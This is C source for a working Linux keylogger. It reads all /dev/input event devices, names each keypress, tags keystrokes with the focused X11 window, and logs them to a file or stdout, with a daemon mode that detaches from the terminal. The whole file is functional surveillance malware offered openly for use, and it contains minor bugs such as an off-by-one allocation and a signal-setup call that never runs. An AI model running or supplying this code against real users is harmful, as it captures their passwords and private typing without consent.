/*
 * This is a simple keylogger to log every key event in a
 * GNU/Linux system. It depends on /dev/input interface, so
 * it doesn't work if you don't have this interface enabled.
 *
 * @author hidark <hidark@gmail.com>
 * @license GNU/GPL v2
 */

// Remove this line to disable X11 support
#define __X11_SUPPORT__

#include <dirent.h>
#include <linux/input.h>
#include <sys/fcntl.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/select.h>
#include <signal.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <glob.h>

#ifdef __X11_SUPPORT__
#include <X11/Xlib.h>
#endif


/*
 * Constants
 */
#define DEV_INPUT 		"/dev/input/event*"
#define FILE_DESCRIPTOR_MOD 	32
#define WAIT_TIME 		1
#define KEYTABLE_SIZE		242
#define DEFAULT_X11_LOCATION	":0"
#define MAX_FD_ERRORS		50
#define MOUSE_EVT		-2
#define X11BUF_LEN		16


/**
 * @field signaled
 * @field daemon
 */
static struct configuration {
#ifdef __X11_SUPPORT__
	/*
	 * X11
	 */
	Display *display;
#endif
	char pressed_key[KEYTABLE_SIZE];

	int signaled : 1;
	int daemon : 1;
	int file_output : 1;
	char *file_name;
} configuration;

/**
 * ASCII representations of numeric codes given by /dev/input interface
 */
static char *event_codes[] = {
	"<RESERVED>",
	"<ESC>",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"0",
	"<MINUS>",
	"<EQUAL>",
	"<BACKSPACE>",
	"<TAB>",
	"Q",
	"W",
	"E",
	"R",
	"T",
	"Y",
	"U",
	"I",
	"O",
	"P",
	"<LEFTBRACE>",
	"<RIGHTBRACE>",
	"<ENTER>",
	"<LEFTCTRL>",
	"A",
	"S",
	"D",
	"F",
	"G",
	"H",
	"J",
	"K",
	"L",
	"<SEMICOLON>",
	"<APOSTROPHE>",
	"<GRAVE>",
	"<LEFTSHIFT>",
	"<BACKSLASH>",
	"Z",
	"X",
	"C",
	"V",
	"B",
	"N",
	"M",
	"<COMMA>",
	"<DOT>",
	"<SLASH>",
	"<RIGHTSHIFT>",
	"<KPASTERISK>",
	"<LEFTALT>",
	"<SPACE>",
	"<CAPSLOCK>",
	"<F1>",
	"<F2>",
	"<F3>",
	"<F4>",
	"<F5>",
	"<F6>",
	"<F7>",
	"<F8>",
	"<F9>",
	"<F10>",
	"<NUMLOCK>",
	"<SCROLLLOCK>",
	"<KP7>",
	"<KP8>",
	"<KP9>",
	"<KPMINUS>",
	"<KP4>",
	"<KP5>",
	"<KP6>",
	"<KPPLUS>",
	"<KP1>",
	"<KP2>",
	"<KP3>",
	"<KP0>",
	"<KPDOT>",
	"<ZENKAKUHANKAKU>",
	"<102ND>",
	"<F11>",
	"<F12>",
	"<RO>",
	"<KATAKANA>",
	"<HIRAGANA>",
	"<HENKAN>",
	"<KATAKANAHIRAGANA>",
	"<MUHENKAN>",
	"<KPJPCOMMA>",
	"<KPENTER>",
	"<RIGHTCTRL>",
	"<KPSLASH>",
	"<SYSRQ>",
	"<RIGHTALT>",
	"<LINEFEED>",
	"<HOME>",
	"<UP>",
	"<PAGEUP>",
	"<LEFT>",
	"<RIGHT>",
	"<END>",
	"<DOWN>",
	"<PAGEDOWN>",
	"<INSERT>",
	"<DELETE>",
	"<MACRO>",
	"<MUTE>",
	"<VOLUMEDOWN>",
	"<VOLUMEUP>",
	"<POWER>",
	"<KPEQUAL>",
	"<KPPLUSMINUS>",
	"<PAUSE>",
	"<KPCOMMA>",
	"<HANGEUL>",
	"<HANGUEL>",
	"<HANJA>",
	"<YEN>",
	"<LEFTMETA>",
	"<RIGHTMETA>",
	"<COMPOSE>",
	"<STOP>",
	"<AGAIN>",
	"<PROPS>",
	"<UNDO>",
	"<FRONT>",
	"<COPY>",
	"<OPEN>",
	"<PASTE>",
	"<FIND>",
	"<CUT>",
	"<HELP>",
	"<MENU>",
	"<CALC>",
	"<SETUP>",
	"<SLEEP>",
	"<WAKEUP>",
	"<FILE>",
	"<SENDFILE>",
	"<DELETEFILE>",
	"<XFER>",
	"<PROG1>",
	"<PROG2>",
	"<WWW>",
	"<MSDOS>",
	"<COFFEE>",
	"<SCREENLOCK>",
	"<DIRECTION>",
	"<CYCLEWINDOWS>",
	"<MAIL>",
	"<BOOKMARKS>",
	"<COMPUTER>",
	"<BACK>",
	"<FORWARD>",
	"<CLOSECD>",
	"<EJECTCD>",
	"<EJECTCLOSECD>",
	"<NEXTSONG>",
	"<PLAYPAUSE>",
	"<PREVIOUSSONG>",
	"<STOPCD>",
	"<RECORD>",
	"<REWIND>",
	"<PHONE>",
	"<ISO>",
	"<CONFIG>",
	"<HOMEPAGE>",
	"<REFRESH>",
	"<EXIT>",
	"<MOVE>",
	"<EDIT>",
	"<SCROLLUP>",
	"<SCROLLDOWN>",
	"<KPLEFTPAREN>",
	"<KPRIGHTPAREN>",
	"<NEW>",
	"<REDO>",
	"<F13>",
	"<F14>",
	"<F15>",
	"<F16>",
	"<F17>",
	"<F18>",
	"<F19>",
	"<F20>",
	"<F21>",
	"<F22>",
	"<F23>",
	"<F24>",
	"<PLAYCD>",
	"<PAUSECD>",
	"<PROG3>",
	"<PROG4>",
	"<SUSPEND>",
	"<CLOSE>",
	"<PLAY>",
	"<FASTFORWARD>",
	"<BASSBOOST>",
	"<PRINT>",
	"<HP>",
	"<CAMERA>",
	"<SOUND>",
	"<QUESTION>",
	"<EMAIL>",
	"<CHAT>",
	"<SEARCH>",
	"<CONNECT>",
	"<FINANCE>",
	"<SPORT>",
	"<SHOP>",
	"<ALTERASE>",
	"<CANCEL>",
	"<BRIGHTNESSDOWN>",
	"<BRIGHTNESSUP>",
	"<MEDIA>",
	"<SWITCHVIDEOMODE>",
	"<outputs>",
	"<KBDILLUMTOGGLE>",
	"<KBDILLUMDOWN>",
	"<KBDILLUMUP>",
	"<SEND>",
	"<REPLY>",
	"<FORWARDMAIL>",
	"<SAVE>",
	"<DOCUMENTS>",
	"<BATTERY>",
	"<BLUETOOTH>",
	"<WLAN>",
	"<UWB>",
	"<UNKNOWN>",
	"<VIDEO_NEXT>",
	"<VIDEO_PREV>",
	"<BRIGHTNESS_CYCLE>",
	"<BRIGHTNESS_ZERO>",
	"<DISPLAY_OFF>",
	"<WIMAX>",
	NULL
};

/*
 * Declaration of functions and structs
 */
typedef struct _processed_event processed_event;
struct _processed_event {
	char *ascii;
	unsigned short raw;
	unsigned int key_state;
#ifdef __X11_SUPPORT__
	Window current_win;
#endif
};

typedef struct _input_devices input_devices;
struct _input_devices {
	char **devices;
	unsigned int output;
};

/**
 * Open for readonly in->devices and select() between
 * them, writing output to in->output, format is defined
 * with in->flags
 *
 * @params input_devices *target Configuration struct
 * @returns void 
 */
void read_events(input_devices *in);

/**
 * Process a input_event struct for a one /dev/input
 * device
 *
 * @params input_event *evt
 * @returns processed_event* with process data or NULL if can't read
 */
int process_event(const struct input_event *evt, processed_event *kevt);

/**
 * Prepare program to be executed
 */
void prepare(void);

/**
 * Install some signal handlers
 */
void prepare_signals(void);

/**
 * Signal handler to cleanup the system before exit
 * 
 * @params int (ignored)
 */
void cleanup(int);

/**
 * Prints a help in the screen
 *
 * @returns void
 */
void help(void);

/*
 * End of declarations and beginning of definitions
 */


int main(int argc, char *argv[]) {
	int opt,		/* switches */
	    output;		/* Output descriptor */

	glob_t devglob;		/* for glob() */

	input_devices in;	/* Devices to check */

	prepare();		/* Initialize static structs */

	/* Parsing parameters */
	while((opt = getopt(argc, argv, "hdw:")) != -1) {
		switch(opt) {
			case 'w':	/* Where to write */
				configuration.file_output = 1;
				configuration.file_name = (char *) malloc(strlen(optarg));
				strcpy(configuration.file_name, optarg);
				break;
			case 'd':	/* Daemon mode */
				configuration.daemon = 1;
				break;
			case 'h':
			default:
				help();
				exit(EXIT_FAILURE);
				break;
		}
	}


	glob(DEV_INPUT, GLOB_NOSORT, NULL, &devglob);
	if(devglob.gl_pathc) {
		in.devices = devglob.gl_pathv;
		if(configuration.file_output) {
			in.output = open(configuration.file_name, O_CREAT | O_APPEND | O_WRONLY, 0660);
			if(in.output == -1) {
				perror("open()");
				cleanup(0);
				exit(EXIT_FAILURE);
			}
		} else {
			in.output = STDOUT_FILENO;
		}
		
		if(configuration.daemon) {
			if(fork() != 0)
				return 0;

			close(STDIN_FILENO);
			close(STDOUT_FILENO);
			close(STDERR_FILENO);

			setsid();
		}

		prepare_signals;
		read_events(&in);
	}

	globfree(&devglob);

	return 0;
}

/*
 *
 */

void read_events(input_devices *in) {
	fd_set fdset;	/* set of fd for select() */

	int i,		/* index to iterate */
	    fd,		/* current descriptor */
	    max_fd,	/* highest file descriptor number */
	    raw_len,	/* size of raw_fds array */
	    rlen;	/* size for read(fd, ...) */
	
	struct {
	    int *raw;	/* raw file descriptors */
	    int *err;	/* error counter by fd */
	} fd_struct;

	processed_event kevt;	/* struct for return of process_event */

	struct input_event evt;	/* struct to store data from read() */

	struct timeval tv;

#ifdef __X11_SUPPORT__
	char x11buf[X11BUF_LEN];
	int old_win = 0;
#endif

	/*
	 * Open every file, store descriptor in raw_fds (and grow raw_fds if needed),
	 * calculate the maximum number descriptor
	 */
	for(i = 0, raw_len = 0, max_fd = 0, fd_struct.raw = NULL, fd_struct.err = NULL; in->devices[i] != NULL; i++) {
		if(i % FILE_DESCRIPTOR_MOD == 0) {
			fd_struct.raw = realloc(fd_struct.raw, sizeof(int) * ((i / FILE_DESCRIPTOR_MOD) + 1) * FILE_DESCRIPTOR_MOD);
			fd_struct.err = realloc(fd_struct.err, sizeof(int) * ((i / FILE_DESCRIPTOR_MOD) + 1) * FILE_DESCRIPTOR_MOD);
		}

		fd = open(in->devices[i], O_RDONLY);
		if(fd != -1) {
			max_fd = (max_fd <= fd) ? fd + 1 : max_fd;
			fd_struct.err[raw_len] = 0;
			fd_struct.raw[raw_len++] = fd;
		}
	}	


	/*
	 * Monitor all descriptors and read them when ready, process every event and write it
	 * in human readable form to a given descriptor.
	 */
	while(!configuration.signaled) {
		FD_ZERO(&fdset);
		for(i = 0; i < raw_len; i++) {
			if(fd_struct.err[i] < MAX_FD_ERRORS)
				FD_SET(fd_struct.raw[i], &fdset);
		}

		tv.tv_sec = WAIT_TIME;
		tv.tv_usec = 0;
		i = select(max_fd, &fdset, NULL, NULL, &tv);

		if(!configuration.signaled) {
			for(i = 0; i < raw_len; i++) {
				fd = fd_struct.raw[i];
				if(FD_ISSET(fd, &fdset)) {
					rlen = read(fd, &evt, sizeof(struct input_event));
					if(rlen == sizeof(struct input_event)) {
						switch(process_event(&evt, &kevt)) {
							case 0:
#ifdef __X11_SUPPORT__
								if(kevt.current_win != old_win) {
									snprintf(x11buf, X11BUF_LEN, "\n\n%d: ", kevt.current_win);
									write(in->output, x11buf, strlen(x11buf));

									old_win = kevt.current_win;
								}
#endif
								write(in->output, kevt.ascii, strlen(kevt.ascii));
								break;
							case MOUSE_EVT:
								fd_struct.err[i]++;
								break;
						}
					}
				}
			}
		}
	}

	/*
	 * Free stuff
	 */
	for(i = 0; i < raw_len; i++)
		close(fd_struct.raw[i]);

	free(fd_struct.raw);
	free(fd_struct.err);
}


int process_event(const struct input_event *evt, processed_event *kevt) {
#ifdef __X11_SUPPORT__
	int focus_state;
#endif

	/*
	 * If type of event is a key event then fill kevt structure
	 */
	switch(evt->type) {
		case EV_KEY:
			if(evt->code > 0 && evt->code < KEYTABLE_SIZE) {
				/* If key isn't pressed yet */
				if(!configuration.pressed_key[evt->code]) {
#ifdef __X11_SUPPORT__
					XGetInputFocus(configuration.display, &kevt->current_win, &focus_state);
#endif
					kevt->ascii = event_codes[evt->code];
					kevt->raw = evt->code;
					configuration.pressed_key[evt->code] = 1;
	
					return 0;
				}
				configuration.pressed_key[evt->code] = 0;
			}
			break;
		case EV_ABS:
		case EV_REL:
			return MOUSE_EVT;
			break;
		default:
			return -1;
			break;
	}
}

void prepare(void) {
	memset(&configuration, 0, sizeof(struct configuration));

#ifdef __X11_SUPPORT__
	configuration.display = XOpenDisplay(NULL);
#endif
}

void prepare_signals() {
	/* Installing signal handlers */
	signal(SIGHUP, cleanup);
	signal(SIGINT, cleanup);
	signal(SIGPIPE, SIG_IGN);
	signal(SIGTERM, cleanup);
	signal(SIGUSR1, cleanup);
	signal(SIGUSR2, cleanup);
}

void cleanup(int ignored) {
	configuration.signaled = 1;
	if(configuration.file_output) 
		free(configuration.file_name);
#ifdef __X11_SUPPORT__
	XCloseDisplay(configuration.display);
#endif
}

void help(void) {
	printf("Usage:\n");
	printf("-w <log_file>		Log file, (default is STDOUT)\n");
	printf("-d			Daemon mode\n");
}
